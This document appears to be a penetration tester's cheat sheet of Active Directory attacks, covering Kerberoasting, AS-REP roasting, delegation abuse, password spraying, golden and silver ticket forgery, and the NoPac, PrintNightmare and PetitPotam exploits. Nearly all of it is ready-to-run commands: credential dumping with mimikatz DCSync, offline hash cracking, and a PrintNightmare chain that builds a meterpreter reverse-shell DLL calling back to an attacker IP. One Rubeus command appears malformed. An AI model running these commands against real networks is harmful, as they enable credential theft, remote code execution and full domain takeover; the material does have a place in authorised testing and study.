## Kerberoasting

Request TGS tickets for accounts with SPNs set. The tickets are encrypted with the account's NT hash and can be cracked offline.

### From Windows

```powershell
Invoke-Kerberoast
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:<username> /nowrap
```

### From Linux

```bash
GetUserSPNs.py <domain>/<username>
GetUserSPNs.py -dc-ip <dc-ip> <DOMAIN>/<username> -request
GetUserSPNs.py -dc-ip <dc-ip> <DOMAIN>/<username> -request-user <service-account> -outputfile <service-account>_tgs
```

### Crack Kerberoast Hash

```bash
hashcat -m 13100 <hash-file> /usr/share/wordlists/rockyou.txt
```

---

## ASREPRoasting

Find accounts with Kerberos pre-authentication disabled and request their AS-REP hash offline.

### From Windows

```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
.\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
```

### From Linux

```bash
GetNPUsers.py <domain>/<username>
kerbrute userenum users.txt --dc <dc-hostname>.<domain> -d <domain>
```

### Crack ASREPRoast Hash

```bash
hashcat -m 18200 <hash-file> /usr/share/wordlists/rockyou.txt
```

---

## Unconstrained Delegation

If you can compromise a host configured for unconstrained delegation, any Kerberos authentication to that host will deposit the authenticating user's TGT in memory. Combine with a coercion attack to force a DC to authenticate.

### Find Hosts with Unconstrained Delegation

```powershell
Get-DomainComputer -Unconstrained | select samaccountname
```

### Monitor for TGTs Deposited in Memory

```powershell
.\Rubeus.exe monitor /interval:5
```

### Renew Captured TGT and Pass It

```powershell
.\Rubeus.exe renew /ticket:<base64-ticket> /ptt
.\Rubeus.exe asktgs /ticket:<base64-ticket> /service:<SPN> /ptt
```

---

## Constrained Delegation

If a service account is configured for constrained delegation, it can request tickets on behalf of any user to the allowed target services via S4U2proxy.

### Find Constrained Delegation Accounts

```powershell
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
```

```bash
findDelegation.py <domain>/<username>
```

### S4U Attack (Windows - Rubeus)

```powershell
.\Rubeus.exe s4u /impersonateuser:<target-user> /msdsspn:<SPN> /altservice:<service> /user:<service-account> /rc4:<hash> /ptt
```

### S4U Attack (Linux - getST.py)

```bash
getST.py -spn <SPN> -hashes :<hash> '<domain>/<service-account>' -impersonate <target-user>
```

---

## Password Spraying via Kerberos

Spray passwords via TGT request to avoid NTLM and reduce log noise.

```bash
kerbrute passwordspray users.txt <password> --dc <dc-hostname>.<domain> -d <domain>
```

---

## Golden Ticket

Forge a TGT using the KRBTGT account's NT hash. Provides persistent domain access even after password resets (until KRBTGT password is reset twice).

### Dump KRBTGT Hash

```powershell
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\krbtgt
```

### Get Domain SID

```powershell
Get-DomainSID
```

### Forge Golden Ticket (Windows - Mimikatz)

```powershell
mimikatz # kerberos::golden /domain:<domain> /user:<user> /sid:<Domain-SID> /rc4:<krbtgt-hash> /ptt
```

### Forge Golden Ticket (Linux - ticketer.py)

```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid <Domain-SID> -domain <domain> <user>
export KRB5CCNAME=<user>.ccache
```

### Dump TGT from Memory

```powershell
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt
```

---

## Silver Ticket

Forge a TGS for a specific service using the service account's NT hash. No DC contact required.

### Forge Silver Ticket (Windows - Mimikatz)

```powershell
mimikatz # kerberos::golden /domain:<domain> /user:<user> /sid:<Domain-SID> /rc4:<service-account-hash> /target:<service-account-fqdn> /service:<service-type> /ptt
```

### Forge Silver Ticket (Linux - ticketer.py)

```bash
ticketer.py -nthash <service-account-hash> -domain-sid <Domain-SID> -domain <domain> -spn <SPN> <user>
```

---

## NoPac (CVE-2021-42278/42287)

Combined vulnerability allowing a low-privilege user to impersonate a domain controller and gain SYSTEM-level access.

### Scan for Vulnerability

```bash
sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <dc-ip> -use-ldap
```

### Exploit - Get SYSTEM Shell

```bash
sudo python3 noPac.py <DOMAIN>/<username>:<password> -dc-ip <dc-ip> -dc-host <dc-hostname> -shell --impersonate administrator -use-ldap
```

### Exploit - DCSync

```bash
sudo python3 noPac.py <DOMAIN>/<username>:<password> -dc-ip <dc-ip> -dc-host <dc-hostname> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

---

## PrintNightmare (CVE-2021-1675)

Remote code execution via the Windows Print Spooler service.

### Check if Target is Vulnerable

```bash
rpcdump.py @<dc-ip> | egrep 'MS-RPRN|MS-PAR'
```

### Generate DLL Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=8080 -f dll > backupscript.dll
```

### Host the DLL

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

### Execute the Exploit

```bash
sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<dc-ip> '\\<attacker-ip>\CompData\backupscript.dll'
```

---

## PetitPotam (NTLM Relay to AD CS)

Coerce DC authentication to your relay listener, relay to AD CS web enrollment, and obtain a certificate for the DC machine account, then use PKINITtools to get the DC's NT hash.

### Setup NTLM Relay to AD CS

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<ca-hostname>.<domain>/certsrv/certfnsh.asp --adcs --template DomainController
```

### Trigger PetitPotam

```bash
python3 PetitPotam.py <attacker-ip> <dc-ip>
```

### Request TGT with Certificate

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<dc-hostname>$ -pfx-base64 <base64-certificate> dc01.ccache
klist
```

### Extract NT Hash from TGT

```bash
python /opt/PKINITtools/getnthash.py -key <session-key> <DOMAIN>/<dc-hostname>$
```

### DCSync with Extracted Hash

```bash
secretsdump.py -just-dc-user <DOMAIN>/administrator "<dc-hostname>$"@<dc-ip> -hashes aad3c435b514a4eeaad3b935b51304fe:<nt-hash>
```

### Pass-the-Ticket (Windows)

```powershell
.\Rubeus.exe asktgt /user:<dc-hostname>$ /<base64-certificate>=/ptt
mimikatz # lsadump::dcsync /user:<domain>\krbtgt
```
